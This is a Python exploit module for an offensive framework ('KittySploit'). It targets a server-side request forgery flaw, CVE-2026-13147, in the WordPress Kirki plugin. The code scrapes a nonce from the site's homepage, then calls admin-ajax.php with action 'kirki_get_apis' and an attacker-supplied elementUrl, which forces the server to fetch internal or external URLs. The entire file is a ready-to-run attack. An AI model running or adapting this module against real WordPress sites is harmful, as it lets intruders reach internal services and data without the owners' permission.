#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kirki CVE-2026-13147 — kirki_get_apis elementUrl SSRF."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Kirki CVE-2026-13147 SSRF",
        "description": (
            "GET admin-ajax.php action=kirki_get_apis with attacker elementUrl. "
            "Use ssrf_url (e.g. Burp Collaborator) to confirm outbound request."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-13147"],
        "tags": ["wordpress", "kirki", "ssrf", "cve-2026-13147"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    ssrf_url = OptString("http://127.0.0.1:80/", "elementUrl target", required=False)
    kirki_nonce = OptString("", "X-WP-Nonce (auto from homepage)", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _nonce(self) -> str:
        forced = (self.kirki_nonce or "").strip()
        if forced:
            return forced
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        m = re.search(r'nonce:\s*"([a-f0-9]{10})"', home.text or "") if home else None
        return m.group(1) if m else ""

    def run(self):
        nonce = self._nonce()
        if not nonce:
            print_error("Kirki nonce not found on homepage")
            return False
        url = (self.ssrf_url or "http://127.0.0.1:80/").strip()
        resp = self.http_request(
            method="GET",
            path=self._join("/wp-admin/admin-ajax.php"),
            params={
                "action": "kirki_get_apis",
                "endpoint": "get-pre-built-html",
                "elementUrl": url,
            },
            headers={"X-WP-Nonce": nonce},
            allow_redirects=False,
            timeout=20,
        )
        if resp and int(resp.status_code or 0) in (200, 400, 500):
            print_success("kirki_get_apis request sent")
            print_status((resp.text or "")[:500])
            print_status(f"Confirm callback at {url}")
            return True
        print_error("SSRF probe failed")
        return False
